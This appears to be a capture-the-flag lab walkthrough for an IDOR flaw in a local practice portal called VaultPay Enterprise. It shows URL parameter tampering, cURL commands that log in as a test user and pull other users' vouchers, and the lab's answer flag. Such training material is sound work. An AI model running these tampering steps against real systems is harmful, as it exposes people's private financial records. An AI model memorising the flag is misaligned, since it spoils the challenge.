# Practice Walkthrough: Investigating & Proving IDOR on VaultPay Enterprise

In this guided lab exercise, you will conduct a systematic security audit against the institutional treasury portal **VaultPay Enterprise** running at `http://127.0.0.1:8011`. This exercise follows a target composition of **60% manual analytical techniques** and **40% terminal-based tool execution**.

---

### Stage 1: Observation & System Mapping (15% — Manual)
The first step of an authorized assessment is establishing a baseline of normal application behavior.

1. Open your web browser and navigate to the target billing portal:
   `http://127.0.0.1:8011`
2. Authenticate using the standard test account:
   - **Username:** `alice`
   - **Password:** `password123`
3. Click on the **"Dispatched Wire Settlement Ledger"** section. Notice that the web UI exclusively renders Alice's legitimate record:
   - `TRX-VLT-1001` (Cloud Infrastructure Compute Retainer - $4,950.00).
4. Click **"View Voucher #1 &rarr;"** and inspect the URL:
   `http://127.0.0.1:8011/wire/1`
   - The numerical index `1` is a Direct Object Reference passed directly to backend queries.

---

### Stage 2: Hypothesis Testing & Parameter Tampering (25% — Manual)
Now test the core hypothesis: *Does the server validate object ownership against Alice's authenticated session?*

1. In the browser address bar, alter the path parameter from:
   `http://127.0.0.1:8011/wire/1`
   to:
   `http://127.0.0.1:8011/wire/2`
2. Press **Enter** and analyze the resulting output:
   - **Observation:** The page renders successfully with an HTTP `200 OK` status.
   - **Evidence Harvested:** The voucher displayed on your screen belongs to senior analyst **Robert Sterling (Bob)** (`TRX-VLT-1002`, $1,450.00)!
   - **Critical Analysis:** The request carried Alice's valid session cookie, but the backend returned Bob's private financial voucher without enforcing object-level authorization.

---

### Stage 3: Controlled Exploitation & Secret Extraction (35% — Tools: cURL)
Leverage cURL or the browser to access high-value sovereign assets.

1. Test special administrative / regulatory clearing index #42:
   `http://127.0.0.1:8011/wire/42` or `http://127.0.0.1:8011/invoice/42`
2. System renders the **Restricted Sovereign Ledger** for VP Controller Marcus Reid:
   - Reference: `TRX-VLT-9901-SOVEREIGN`
   - Amount: `$99,999.00`
   - Compliance Memo: Contains the SOX-404 verification seal:
     `ZITERA{b10k3n_4cc355_c0ntr01_m45t3r}`

3. Replicate via command-line using cURL:
   ```bash
   # 1. Login as Alice and store cookie jar
   curl -s -c cookies.txt -d "username=alice&password=password123" http://127.0.0.1:8011/login

   # 2. Extract Bob's record via IDOR
   curl -s -b cookies.txt http://127.0.0.1:8011/wire/2

   # 3. Retrieve executive voucher #42
   curl -s -b cookies.txt http://127.0.0.1:8011/invoice/42
   ```

---

### Stage 4: Verification & Flag Submission (25%)
Submit the captured flag `ZITERA{b10k3n_4cc355_c0ntr01_m45t3r}` to the Zitera Lab challenge tab to complete the lab!
